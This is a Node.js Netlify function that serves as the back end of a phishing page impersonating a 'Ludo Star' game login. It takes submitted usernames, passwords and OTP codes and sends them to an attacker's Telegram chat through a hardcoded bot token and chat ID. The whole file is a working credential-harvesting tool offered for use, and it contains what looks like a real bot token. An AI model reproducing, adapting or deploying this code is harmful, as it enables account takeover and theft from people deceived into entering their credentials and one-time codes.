const fetch = require('node-fetch');

exports.handler = async (event) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };
  
  // Handle preflight request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }
  
  try {
    // Parse the incoming data
    const data = JSON.parse(event.body);
    const { username, password, otp, type } = data;
    
    // Your Telegram Bot Credentials
    const BOT_TOKEN = '8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito';
    const CHAT_ID = '5614775725';
    
    let telegramMessage = '';
    
    // Check what type of data is being sent
    if (type === 'otp_verification' && otp) {
      // OTP Verification
      telegramMessage = `🔐 *LUDO STAR OTP VERIFICATION* 🔐\n\n` +
                       `🔢 *OTP Code:* \`${otp}\`\n` +
                       `👤 *Username:* ${username || 'Not provided'}\n` +
                       `🕒 *Time:* ${new Date().toLocaleString('en-IN')}\n` +
                       `🌐 *Source:* Netlify Function\n` +
                       `✅ *Status:* User entered OTP`;
      
    } else if (username && password) {
      // Login Attempt
      telegramMessage = `🔐 *LUDO STAR LOGIN ATTEMPT* 🔐\n\n` +
                       `📧 *Email/Phone:* \`${username}\`\n` +
                       `🔑 *Password:* \`${password}\`\n` +
                       `🕒 *Time:* ${new Date().toLocaleString('en-IN')}\n` +
                       `🌐 *Source:* Netlify Function\n` +
                       `🎮 *Game:* Sadiya Khan's Invitation`;
      
    } else {
      // Generic message
      telegramMessage = `📨 *New Data Received*\n\n` +
                       `Data: ${JSON.stringify(data, null, 2)}\n` +
                       `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
    }
    
    // Send message to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMessage,
        parse_mode: 'Markdown'
      })
    });
    
    const result = await telegramResponse.json();
    
    // Log for debugging
    console.log('Telegram API Response:', result);
    
    // Return success response
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully!',
        telegram_response: result.ok,
        data_received: {
          username: username || 'Not provided',
          has_password: !!password,
          has_otp: !!otp,
          type: type || 'login'
        }
      })
    };
    
  } catch (error) {
    console.error('Function error:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.message,
        note: 'Check Netlify function logs for details'
      })
    };
  }
};
